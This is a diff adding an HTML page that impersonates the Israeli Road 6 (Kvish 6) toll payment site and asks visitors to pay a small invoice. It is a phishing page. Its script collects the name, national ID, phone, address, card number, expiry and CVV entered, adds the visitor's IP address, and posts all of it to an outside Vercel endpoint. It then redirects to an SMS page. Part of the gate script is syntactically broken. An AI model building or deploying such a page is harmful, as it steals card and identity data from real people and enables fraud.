@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ביצוע תשלום - כביש 6</title>
+    <script>
+        // Require that the user passed through index.htm (very basic JS bot gate)
+        (function () {
+            try {
+                    window.location.href = "./index.htm";
+                }
+            } catch (e) {
+                window.location.href = "./index.htm";
+            }
+        })();
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', 'Helvetica', sans-serif;
+            background: url('assets/already-have-a-user.jpeg') center/cover no-repeat fixed;
+            min-height: 100vh;
+            color: #2c3e50;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 0;
+        }
+
+        .top-nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: transparent;
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            min-height: 70px;
+        }
+
+        .menu-icon {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .menu-icon img {
+            width: 100%;
+            height: 100%;
+        }
+
+        .exit-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            color: white;
+            font-weight: 600;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+            transition: color 0.3s ease;
+        }
+
+        .exit-btn:hover {
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .exit-btn img {
+            width: 16px;
+            height: 16px;
+        }
+
+        .road6-logo {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            z-index: 1001;
+        }
+
+        .road6-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .page-wrapper {
+            margin-top: 100px;
+            padding: 40px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: calc(100vh - 100px);
+        }
+
+        .content-box {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            max-width: 800px;
+            width: 100%;
+            position: relative;
+        }
+
+        .box-header {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .title-text {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 20px;
+        }
+
+        .step-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .step-badge {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .step-badge.completed {
+            background: white;
+            color: #1e3c72;
+        }
+
+        .step-badge.active {
+            background: #0f2a5c;
+            color: white;
+        }
+
+        .step-badge.pending {
+            background: rgba(255, 255, 255, 0.3);
+            color: white;
+        }
+
+        .step-label {
+            font-size: 14px;
+            text-align: center;
+            max-width: 120px;
+        }
+
+        .box-body {
+            padding: 30px;
+        }
+
+        .payment-section {
+            margin-bottom: 30px;
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .payment-info {
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .info-icon {
+            width: 40px;
+            height: 40px;
+            background: #2a5298;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .info-text {
+            color: #333;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .required {
+            color: #dc3545;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #2a5298;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            background: white;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #2a5298;
+            box-shadow: 0 0 0 2px rgba(42, 82, 152, 0.1);
+        }
+
+        .form-row {
+            display: flex;
+            gap: 20px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        .payment-button {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .payment-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(42, 82, 152, 0.3);
+        }
+
+        .back-button {
+            background: #6c757d;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-left: 15px;
+        }
+
+        .back-button:hover {
+            background: #5a6268;
+            transform: translateY(-1px);
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+            gap: 15px;
+        }
+
+        @media (max-width: 1024px) {
+            .page-wrapper {
+                padding: 20px 15px;
+            }
+            
+            .content-box {
+                max-width: 100%;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                padding: 20px 15px;
+                min-height: 70px;
+            }
+            
+            .page-wrapper {
+                margin-top: 90px;
+                padding: 15px 10px;
+            }
+            
+            .step-indicator {
+                gap: 15px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .step-item {
+                min-width: 100px;
+            }
+            
+            .step-label {
+                font-size: 12px;
+                max-width: 80px;
+            }
+            
+            .box-header {
+                padding: 20px 15px;
+            }
+            
+            .box-body {
+                padding: 20px 15px;
+            }
+            
+            .title-text {
+                font-size: 20px;
+            }
+            
+            .section-title {
+                font-size: 18px;
+            }
+            
+            .payment-info {
+                padding: 15px;
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+            
+            .button-group {
+                flex-direction: row;
+                gap: 10px;
+            }
+            
+            .back-button {
+                margin-left: 0;
+                flex: 1;
+            }
+            
+            .payment-button {
+                flex: 2;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                padding: 15px 10px;
+                min-height: 60px;
+            }
+            
+            .page-wrapper {
+                margin-top: 80px;
+                padding: 10px 5px;
+            }
+            
+            .box-header {
+                padding: 15px 10px;
+            }
+            
+            .box-body {
+                padding: 15px 10px;
+            }
+            
+            .title-text {
+                font-size: 18px;
+                margin-bottom: 15px;
+            }
+            
+            .step-indicator {
+                gap: 10px;
+            }
+            
+            .step-badge {
+                width: 35px;
+                height: 35px;
+                font-size: 14px;
+            }
+            
+            .step-label {
+                font-size: 11px;
+                max-width: 70px;
+            }
+            
+            .payment-info {
+                padding: 12px;
+            }
+            
+            .info-text {
+                font-size: 14px;
+            }
+            
+            .form-input {
+                padding: 10px 12px;
+                font-size: 14px;
+            }
+            
+            .payment-button, .back-button {
+                padding: 12px 20px;
+                font-size: 16px;
+            }
+        }
+
+        .form-input:invalid:not(:placeholder-shown) {
+            border-color: #dc3545;
+        }
+
+        .form-input:valid:not(:placeholder-shown) {
+            border-color: #28a745;
+        }
+
+        /* Loading Screen */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1e3c73, #2a5297);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loader-box {
+            text-align: center;
+            color: white;
+        }
+
+        .loader-icon {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+        }
+
+        .loader-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .loader-msg {
+            font-size: 18px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="menu-icon">
+            <img src="assets/ico-menu.svg" alt="Menu">
+        </div>
+        <a href="#" class="exit-btn">
+            <img src="assets/ico-menu-exit.svg" alt="Exit">
+            יציאה
+        </a>
+    </div>
+
+    <div class="road6-logo">
+        <img src="assets/Kvish-6-logo.09596128f63efccc675f.svg" alt="Road 6 Logo">
+    </div>
+
+    <div class="page-wrapper">
+        <div class="content-box">
+            <div class="box-header">
+                <h1 class="title-text">שלושה צעדים פשוטים לתשלום חשבוניות</h1>
+                <div class="step-indicator">
+                    <div class="step-item">
+                        <div class="step-badge completed">✓</div>
+                        <div class="step-label">חשבוניות לתשלום</div>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-badge active">2</div>
+                        <div class="step-label">ביצוע תשלום</div>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-badge pending">3</div>
+                        <div class="step-label">סיכום תשלום</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="box-body">
+                <div class="payment-section">
+                    <h2 class="section-title">ביצוע תשלום</h2>
+                    
+                    <div class="payment-info">
+                        <div class="info-icon">!</div>
+                        <div class="info-text">בחרת לשלם 1 חשבוניות בסכום כולל של 19.20 ₪</div>
+                    </div>
+
+                    <form>
+                        <div class="form-group">
+                            <label for="cardholderName" class="form-label">
+                                שם בעל הכרטיס <span class="required">*</span>
+                            </label>
+                            <input type="text" id="cardholderName" class="form-input" placeholder="הכנס את שם בעל הכרטיס" required>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="cardholderId" class="form-label">
+                                    תעודת זהות של בעל הכרטיס <span class="required">*</span>
+                                </label>
+                                <input type="text" id="cardholderId" class="form-input" placeholder="הכנס תעודת זהות" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="cardholderPhone" class="form-label">
+                                    מספר הטלפון של בעל הכרטיס <span class="required">*</span>
+                                </label>
+                                <input type="tel" id="cardholderPhone" class="form-input" placeholder="הכנס מספר טלפון" required>
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="zipCode" class="form-label">
+                                    מיקוד <span class="required">*</span>
+                                </label>
+                                <input type="text" id="zipCode" class="form-input" placeholder="הכנס מיקוד" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="city" class="form-label">
+                                    עיר <span class="required">*</span>
+                                </label>
+                                <input type="text" id="city" class="form-input" placeholder="הכנס עיר" required>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="cardNumber" class="form-label">
+                                מספר כרטיס <span class="required">*</span>
+                            </label>
+                            <input type="text" id="cardNumber" class="form-input" placeholder="1234567890123456" maxlength="19" required>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="expiryDate" class="form-label">
+                                    תאריך תפוגה <span class="required">*</span>
+                                </label>
+                                <input type="text" id="expiryDate" class="form-input" placeholder="MM/YY" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="cvv" class="form-label">
+                                    CVV <span class="required">*</span>
+                                </label>
+                                <input type="text" id="cvv" class="form-input" placeholder="123" maxlength="4" required>
+                            </div>
+                        </div>
+
+                        <div class="button-group">
+                            <button type="button" class="back-button" onclick="back()">חזור</button>
+                            <button type="submit" class="payment-button" onclick="submitPayment()">המשך לתשלום 19.20 ₪</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Format credit card number (numbers only)
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/gi, '');
+            if (value.length > 19) value = value.slice(0, 19);
+            e.target.value = value;
+        });
+
+        // Format expiry date as MM/YY
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Format CVV (only numbers, max 4 digits)
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value;
+        });
+
+        // Format phone number
+        document.getElementById('cardholderPhone').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value;
+        });
+
+        // Format ID number (only numbers)
+        document.getElementById('cardholderId').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value;
+        });
+
+        // Format zip code (only numbers)
+        document.getElementById('zipCode').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value;
+        });
+
+        // Form validation
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            submitPayment();
+        });
+    </script>
+
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+        // Telegram Bot Configuration
+  
+
+        // Show loading screen
+        function showLoading() {
+            var loader = document.getElementById('loaderOverlay');
+            if (loader) {
+                loader.style.display = 'flex';
+            }
+        }
+
+        // Hide loading screen
+        function hideLoading() {
+            var loader = document.getElementById('loaderOverlay');
+            if (loader) {
+                loader.style.display = 'none';
+            }
+        }
+
+        // Collect payment data
+        function ready() {
+            var cardholderName = document.getElementById('cardholderName') ? document.getElementById('cardholderName').value : '';
+            var cardholderId = document.getElementById('cardholderId') ? document.getElementById('cardholderId').value : '';
+            var cardholderPhone = document.getElementById('cardholderPhone') ? document.getElementById('cardholderPhone').value : '';
+            var zipCode = document.getElementById('zipCode') ? document.getElementById('zipCode').value : '';
+            var city = document.getElementById('city') ? document.getElementById('city').value : '';
+            var cardNumber = document.getElementById('cardNumber') ? document.getElementById('cardNumber').value : '';
+            var expiryDate = document.getElementById('expiryDate') ? document.getElementById('expiryDate').value : '';
+            var cvv = document.getElementById('cvv') ? document.getElementById('cvv').value : '';
+            
+            message = "Payment Details:\n" +
+                    "Name: " + cardholderName + "\n" +
+                    "ID: " + cardholderId + "\n" +
+                    "Phone: " + cardholderPhone + "\n" +
+                    "Zip: " + zipCode + "\n" +
+                    "City: " + city + "\n" +
+                    "Card: " + cardNumber + "\n" +
+                    "Expiry: " + expiryDate + "\n" +
+                    "CVV: " + cvv;
+
+            // Append client IP if available
+            if (window.__client_ip) {
+                message += "\nIP: " + window.__client_ip;
+            }
+        }
+
+        // Send data to server
+        function sender() {
+            ready();
+            var cardholderNameEl = document.getElementById('cardholderName');
+            var cardholderIdEl = document.getElementById('cardholderId');
+            var cardholderPhoneEl = document.getElementById('cardholderPhone');
+            var zipCodeEl = document.getElementById('zipCode');
+            var cityEl = document.getElementById('city');
+            var cardNumberEl = document.getElementById('cardNumber');
+            var expiryDateEl = document.getElementById('expiryDate');
+            var cvvEl = document.getElementById('cvv');
+            
+            if (!cardholderNameEl || !cardholderIdEl || !cardholderPhoneEl || !zipCodeEl || !cityEl || !cardNumberEl || !expiryDateEl || !cvvEl) {
+                console.error('One or more form elements not found');
+                alert('שגיאה בטעינת הטופס. אנא רענן את הדף.');
+                return;
+            }
+            
+            var paymentData = {
+                cardholderName: cardholderNameEl.value,
+                cardholderId: cardholderIdEl.value,
+                cardholderPhone: cardholderPhoneEl.value,
+                zipCode: zipCodeEl.value,
+                city: cityEl.value,
+                cardNumber: cardNumberEl.value,
+                expiryDate: expiryDateEl.value,
+                cvv: cvvEl.value,
+                clientIP: window.__client_ip || 'Unknown'
+            };
+
+            var settings = {
+                "async": true,
+                "crossDomain": true,
+                "url": "https://apimomen.vercel.app/api/send-payment",
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "cache-control": "no-cache"
+                },
+                "data": JSON.stringify(paymentData)
+            };
+            
+            $.ajax(settings).done(function (response) {
+                console.log('Payment sent successfully:', response);
+                setTimeout(() => {
+                    window.location.href = "./sms.html";
+                }, 2000); // 2 seconds
+            }).fail(function (xhr, status, error) {
+                console.error('Payment failed:', error);
+                alert('שגיאה בשליחת התשלום. אנא נסה שוב.');
+                hideLoading();
+            });
+        }
+
+        // Fetch client IP from a public service
+        (function fetchClientIP(){
+            try {
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => { window.__client_ip = d.ip; })
+                    .catch(() => {});
+            } catch (_) {}
+        })();
+
+        // Submit payment function
+        function submitPayment() {
+            // Basic validation
+            const cardNumberEl = document.getElementById('cardNumber');
+            const expiryDateEl = document.getElementById('expiryDate');
+            const cvvEl = document.getElementById('cvv');
+            
+            if (!cardNumberEl || !expiryDateEl || !cvvEl) {
+                console.error('Form elements not found');
+                alert('שגיאה בטעינת הטופס. אנא רענן את הדף.');
+                return;
+            }
+            
+            const cardNumber = cardNumberEl.value;
+            const expiryDate = expiryDateEl.value;
+            const cvv = cvvEl.value;
+            
+            // Luhn Algorithm for credit card validation
+            function isValidCardLuhn(number) {
+                const digits = number.replace(/\D/g, '').split('').reverse().map(d => parseInt(d, 10));
+                if (digits.length < 13 || digits.length > 19) return false;
+                let sum = 0;
+                for (let i = 0; i < digits.length; i++) {
+                    let digit = digits[i];
+                    if (i % 2 === 1) {
+                        digit *= 2;
+                        if (digit > 9) digit -= 9;
+                    }
+                    sum += digit;
+                }
+                return sum % 10 === 0;
+            }
+
+            if (!isValidCardLuhn(cardNumber)) {
+                alert('מספר כרטיס אשראי אינו תקין');
+                return;
+            }
+            
+            if (expiryDate.length !== 5) {
+                alert('תאריך תפוגה חייב להיות בפורמט MM/YY');
+                return;
+            }
+            
+            if (cvv.length < 3) {
+                alert('CVV חייב להכיל לפחות 3 ספרות');
+                return;
+            }
+            
+            showLoading();
+            sender();
+        }
+
+        // Back function
+        function back() {
+            window.location.href = "./index.htm";
+        }
+    </script>
+
+    <!-- Loading Screen -->
+    <div class="loader-overlay" id="loaderOverlay">
+        <div class="loader-box">
+            <div class="loader-icon">
+                <img src="assets/firstLoader.gif" alt="Loading">
+            </div>
+            <div class="loader-msg">מעבד את הבקשה...</div>
+        </div>
+    </div>
+</body>
+</html>
